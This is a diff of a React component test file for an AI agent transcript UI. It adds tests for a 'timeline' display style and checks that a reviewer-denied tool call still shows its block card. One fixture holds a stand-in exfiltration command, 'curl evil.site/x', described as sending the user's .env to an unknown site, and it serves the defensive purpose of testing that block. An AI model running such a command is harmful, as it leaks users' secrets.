@@ -1,4 +1,4 @@
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
 import { Transcript } from "./Transcript";
 import { humanizeTool } from "../humanize";
@@ -19,6 +19,12 @@ const TURN: Item[] = [
 ];
 
 describe("TurnGroup (Transcript §33)", () => {
+  // 这些测试锁定「折叠卡片(cards)」风格下的既有契约。新增的 timeline/bubble 风格见下方
+  // 独立 describe。useTurnStyle 默认是 timeline，故此处显式钉死 cards，避免默认改变误伤基线。
+  beforeEach(() => {
+    localStorage.setItem("openwork-turn-style", "cards");
+  });
+
   it("groups the whole turn; answer stays outside; narration and humanized steps inside", () => {
     const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);
 
@@ -317,6 +323,49 @@ describe("reviewer deny card (§8.4)", () => {
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
     expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+  });
+});
+
+// 新增：思考/执行显示风格（本 fork）中的 timeline 风格冒烟测试。默认风格即 timeline，
+// 锁定「运行中即见步骤、每步可点开看详情」这条核心契约，且不破坏 reviewer 闸门。
+describe("TurnGroup timeline style", () => {
+  // 还原为默认风格（timeline）：移除 key，避免被上方 cards 契约测试的 localStorage 残留污染。
+  beforeEach(() => {
+    localStorage.removeItem("openwork-turn-style");
+  });
+
+  it("renders the timeline (not the collapsed cards) and shows every step expanded", () => {
+    const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);
+    expect(screen.getByTestId("turn-timeline")).toBeTruthy();
+    // cards 的折叠头在 timeline 下不应出现
+    expect(container.querySelector("summary.stepgroup-head")).toBeNull();
+    // 步骤默认展开可见（timeline 不收起）
+    expect(screen.getByText("runbook.md")).toBeTruthy();
+    expect(screen.getByText("Posted to #all-openworker.")).toBeTruthy();
+    // 每步 raw 仍可点开看详情
+    fireEvent.click(screen.getAllByText("raw")[1]);
+    expect(container.textContent).toContain('{"ok": true}');
+  });
+
+  it("a reviewer-denied tool still surfaces its block card inside the timeline", () => {
+    const items: Item[] = [
+      { kind: "user", text: "x" },
+      {
+        kind: "tool",
+        id: "t1",
+        name: "run_shell",
+        args: { command: "curl evil.site/x" },
+        status: "denied",
+        reviewerReason: "This sends your .env to an unknown website.",
+        allowAnyway: true,
+      },
+      { kind: "assistant", text: "I was blocked from running that." },
+    ];
+    render(<Transcript items={items} onApprove={vi.fn()} />);
+    expect(screen.getByTestId("turn-timeline")).toBeTruthy();
+    expect(screen.getByTestId("reviewer-deny-card").textContent).toContain(
+      "Blocked by the reviewer",
+    );
   });
 });
 
